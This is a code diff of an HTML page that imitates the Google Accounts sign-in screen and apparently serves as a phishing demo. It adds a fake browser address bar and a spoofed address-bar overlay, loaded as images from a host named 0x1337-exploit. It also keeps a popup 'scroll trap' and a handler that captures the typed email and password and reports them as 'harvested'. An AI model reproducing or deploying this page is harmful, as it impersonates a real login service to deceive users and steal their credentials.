@@ -1,24 +1,85 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in - Google Accounts</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
       font-family: "Google Sans", Roboto, Arial, sans-serif;
       background: #ffffff;
       color: #202124;
       min-height: 6200px;
       transition: scroll-behavior 0.9s cubic-bezier(0.25, 0.1, 0.25, 1);
+      position: relative;
     }
+
+    /* --- Fake Address Bar (sticky di bawah) --- */
+    .fake-address-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 70px;
+      background: #fff;
+      border-top: 1px solid #dadce0;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .fake-address-bar img {
+      max-height: 100%;
+      width: auto;
+      display: block;
+    }
+
+    /* --- Spoofed Address Bar Animation (arc2) --- */
+    .spoofed-bar-overlay {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 50vh;               /* setengah layar */
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 9998;
+      display: none;
+      align-items: flex-end;
+      overflow: hidden;
+    }
+    .spoofed-bar-overlay.active {
+      display: flex;
+    }
+    .spoofed-bar-content {
+      width: 100%;
+      height: 100%;
+      background: url('https://0x1337-exploit.github.io/hosting/staging/arc2.jpeg') no-repeat center top;
+      background-size: cover;
+      transform: translateY(100%);
+      transition: transform 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+      opacity: 0;
+    }
+    .spoofed-bar-overlay.active .spoofed-bar-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    /* --- Konten utama --- */
     .top-bar {
       position: fixed;
-      top: 0; left: 0; right: 0;
+      top: 0;
+      left: 0;
+      right: 0;
       height: 64px;
       background: #ffffff;
       border-bottom: 1px solid #dadce0;
@@ -27,7 +88,7 @@
       align-items: center;
       justify-content: flex-end;
       padding: 0 24px;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.08);
       transition: opacity 0.5s ease;
     }
     .top-bar.hidden {
@@ -47,7 +108,7 @@
     }
     .evil-btn:hover {
       background: #0d65d6;
-      box-shadow: 0 4px 12px rgba(26,115,232,0.4);
+      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.4);
       transform: translateY(-3px);
     }
     .void {
@@ -60,7 +121,7 @@
       margin: 0 auto;
       background: #ffffff;
       border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 2px 4px rgba(0,0,0,0.12);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15), 0 2px 4px rgba(0, 0, 0, 0.12);
       padding: 60px 44px 48px;
       margin-top: 80px;
     }
@@ -75,32 +136,75 @@
       background-size: contain;
       display: inline-block;
     }
-    h1 { font-size: 26px; font-weight: 400; margin-bottom: 10px; text-align: center; }
-    .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 36px; }
+    h1 {
+      font-size: 26px;
+      font-weight: 400;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .subtitle {
+      color: #5f6368;
+      font-size: 16px;
+      text-align: center;
+      margin-bottom: 36px;
+    }
     input {
-      width: 100%; height: 56px; padding: 0 16px;
-      border: 1px solid #dadce0; border-radius: 4px;
-      font-size: 16px; margin-bottom: 24px;
-      outline: none; transition: all 0.25s;
+      width: 100%;
+      height: 56px;
+      padding: 0 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-bottom: 24px;
+      outline: none;
+      transition: all 0.25s;
     }
     input:focus {
       border-color: #1a73e8;
-      box-shadow: 0 0 0 2px rgba(26,115,232,0.3);
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.3);
     }
-    .forgot { color: #1a73e8; font-size: 14px; text-decoration: none; display: block; margin: 12px 0 36px; }
+    .forgot {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin: 12px 0 36px;
+    }
     .btn-primary {
-      background: #1a73e8; color: white; border: none;
-      border-radius: 4px; padding: 14px 24px;
-      font-size: 15px; font-weight: 500;
-      cursor: pointer; width: 100%;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 14px 24px;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      width: 100%;
       transition: background 0.2s;
     }
-    .btn-primary:hover { background: #185abc; }
-    .create-account { text-align: center; margin-top: 36px; color: #1a73e8; font-size: 14px; }
+    .btn-primary:hover {
+      background: #185abc;
+    }
+    .create-account {
+      text-align: center;
+      margin-top: 36px;
+      color: #1a73e8;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
+  <!-- Fake address bar yang sticky di bawah -->
+  <div class="fake-address-bar" id="fakeAddressBar">
+    <img src="https://0x1337-exploit.github.io/hosting/staging/arc1.jpeg" alt="Fake address bar" />
+  </div>
 
+  <!-- Overlay animasi arc2 -->
+  <div class="spoofed-bar-overlay" id="spoofedOverlay">
+    <div class="spoofed-bar-content"></div>
+  </div>
+
+  <!-- Konten utama -->
   <div class="top-bar" id="topBar">
     <button class="evil-btn" id="evilTrigger">Open New Page</button>
   </div>
@@ -113,29 +217,28 @@
     </div>
     <h1>Sign in</h1>
     <div class="subtitle">Use your Google Account</div>
-    
-    <input type="email" id="emailField" placeholder="Email or phone" autocomplete="username">
-    <input type="password" id="passField" placeholder="Password" autocomplete="current-password">
-    
+
+    <input type="email" id="emailField" placeholder="Email or phone" autocomplete="username" />
+    <input type="password" id="passField" placeholder="Password" autocomplete="current-password" />
+
     <a href="#" class="forgot">Forgot password?</a>
-    
+
     <button class="btn-primary" id="submitBtn">Next</button>
-    
+
     <div class="create-account">
       <a href="#">Create account</a>
     </div>
   </div>
 
   <script>
-    // Evil trigger button - disappears after one click
-    const evilButton = document.getElementById('evilTrigger');
-    const topBar = document.getElementById('topBar');
+    // 1. Tombol "Open New Page" menghilang setelah diklik
+    const evilButton = document.getElementById("evilTrigger");
+    const topBar = document.getElementById("topBar");
 
-    evilButton.addEventListener('click', () => {
-      topBar.classList.add('hidden');
+    evilButton.addEventListener("click", () => {
+      topBar.classList.add("hidden");
 
-      // Open the scroll trap tab
-      const newWin = window.open('', '_blank', 'width=900,height=700,menubar=no,toolbar=no,scrollbars=yes');
+      const newWin = window.open("", "_blank", "width=900,height=700,menubar=no,toolbar=no,scrollbars=yes");
       if (newWin) {
         newWin.document.write(`
           <!DOCTYPE html>
@@ -145,20 +248,12 @@
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>Google - Loading...</title>
             <style>
-              body {
-                margin:0; padding:0;
-                font-family: Arial, sans-serif;
-                background: #ffffff;
-                color: #202124;
-                min-height: 6200px;
-                text-align: center;
-                overflow-x: hidden;
-              }
-              .arrow-container { padding: 200px 20px 120px; font-size: 140px; color: #ea4335; animation: pulse 1.8s infinite; }
-              .text { font-size: 42px; font-weight: bold; color: #1a73e8; margin: 50px 0; }
-              .small-text { font-size: 26px; color: #5f6368; margin: 70px 0; }
-              @keyframes pulse { 0%,100% { transform:scale(1); opacity:0.8; } 50% { transform:scale(1.2); opacity:1; } }
-              .arrow-row { margin: 140px 0; font-size: 200px; color: #4285f4; }
+              body {margin:0;padding:0;font-family:Arial,sans-serif;background:#ffffff;color:#202124;min-height:6200px;text-align:center;overflow-x:hidden;}
+              .arrow-container {padding:200px 20px 120px;font-size:140px;color:#ea4335;animation:pulse 1.8s infinite;}
+              .text {font-size:42px;font-weight:bold;color:#1a73e8;margin:50px 0;}
+              .small-text {font-size:26px;color:#5f6368;margin:70px 0;}
+              @keyframes pulse {0%,100%{transform:scale(1);opacity:0.8;}50%{transform:scale(1.2);opacity:1;}}
+              .arrow-row {margin:140px 0;font-size:200px;color:#4285f4;}
             </style>
           </head>
           <body>
@@ -176,32 +271,39 @@
         newWin.document.close();
       }
 
-      // Auto-scroll to login form
+      // Auto scroll ke form login
       setTimeout(() => {
-        window.scrollTo({
-          top: document.body.scrollHeight,
-          behavior: 'smooth'
-        });
-
+        window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
         setTimeout(() => {
-          document.getElementById('emailField').focus();
-          const glow = document.getElementById('emailField');
-          glow.style.boxShadow = '0 0 0 4px rgba(26,115,232,0.45)';
+          document.getElementById("emailField").focus();
+          const glow = document.getElementById("emailField");
+          glow.style.boxShadow = "0 0 0 4px rgba(26,115,232,0.45)";
           setTimeout(() => {
-            glow.style.boxShadow = '0 0 0 2px rgba(26,115,232,0.2)';
+            glow.style.boxShadow = "0 0 0 2px rgba(26,115,232,0.2)";
           }, 1200);
         }, 2200);
       }, 600);
     });
 
-    // === CREDENTIAL HARVESTING & DISPLAY ===
-    document.getElementById('submitBtn').addEventListener('click', (e) => {
-      e.preventDefault(); // prevent any default form behavior
+    // 2. Klik fake address bar → muncul animasi arc2
+    const fakeAddressBar = document.getElementById("fakeAddressBar");
+    const spoofedOverlay = document.getElementById("spoofedOverlay");
 
-      const email = document.getElementById('emailField').value.trim();
-      const password = document.getElementById('passField').value.trim();
+    fakeAddressBar.addEventListener("click", () => {
+      spoofedOverlay.classList.add("active");
 
-      // Show harvested credentials in a beautiful alert
+      // Optional: tutup overlay setelah beberapa detik (misal 4 detik)
+      setTimeout(() => {
+        spoofedOverlay.classList.remove("active");
+      }, 4000);
+    });
+
+    // 3. Harvest credential (tetap seperti sebelumnya)
+    document.getElementById("submitBtn").addEventListener("click", (e) => {
+      e.preventDefault();
+      const email = document.getElementById("emailField").value.trim();
+      const password = document.getElementById("passField").value.trim();
+
       if (email && password) {
         alert(
           `Credentials successfully harvested!\n\n` +
@@ -213,7 +315,6 @@
         alert("Please fill in both fields before continuing.");
       }
 
-      // Optional: you can add console.log, send to server, localStorage, etc here
       console.log(`[HARVEST] Email: ${email} | Pass: ${password}`);
     });
   </script>
